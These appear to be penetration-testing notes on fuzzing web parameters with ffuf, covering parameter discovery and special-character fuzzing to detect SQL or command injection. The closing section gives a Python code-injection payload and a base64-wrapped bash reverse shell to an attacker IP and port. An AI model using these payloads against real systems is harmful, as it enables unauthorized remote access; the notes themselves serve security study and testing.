# Fuzzing to find unknown parameters
## GET requests
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://target.com:PORT/page.php?FUZZ=key
```
Get the regular size of a failed parameter from the reqs, then filter them out...
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://target.com:PORT/page.php?FUZZ=key -fs [RESPONSE REQUEST SIZE TO FILTER OUT]
```
## POST requests
PHP needs to use application/x-www-form-urlencoded header. Other technology stacks might need other headers.
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://target.com:PORT/page.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

# Fuzzing known parameter values
Take the following request:

![image](https://github.com/user-attachments/assets/414ef308-71c2-436b-bfaf-f3d8e690bc76)

## Step 1: Copy to file
![image](https://github.com/user-attachments/assets/dc63395b-ad89-431a-bb16-17cb4b8fcfdf)
In this case, the file is saved as "search.req".
## Step 2: Add fuzz to request
![image](https://github.com/user-attachments/assets/1ffc985b-21b2-4d2a-a7ed-acab02dabe21)
## Step 3: ffuf
```bash
ffuf -request search.req -request-proto http -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt -ms 0
```
-request-proto only is required for http as https is the default.
## Step 4: Analyze output
![image](https://github.com/user-attachments/assets/9ff86037-bf98-4763-9f60-4a686f5a853e)
This shows that when the parameter has a \ or ' at the end of it, the page returns nothing - indicating either SQL injection or command injection.
### SQLi Checks
Try standard SQLi checks such as -- - # // 
### Command Injection Checks
If there is a ', then it may form part of a statement - for example: print('INPUT'). So if INPUT=')# and it is similar to the example, then the statement will be print('')#') which is valid and the page will return content instead of 0.

INPUT: 
```
abc'
```

INPUT:
```
abc')#
```

To demonstrate how this leads to code execution, let's try the following: 
```
abc')%20%2b%20print('Code%20Execution%20possible!')%23%20
```

To get a reverse shell, do the following:
```bash
echo -n "bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1" | base64
```
Add the following payload to the vulnerable parameter:
```
__import__('os').system('echo -n $OUTPUT_OF_PREVIOUS_COMMAND | base64 -d | bash')
```
REMEMBER TO URL ENCODE THE PAYLOAD!!! Make sure characters such as + are encoded and not mistaken for spaces!
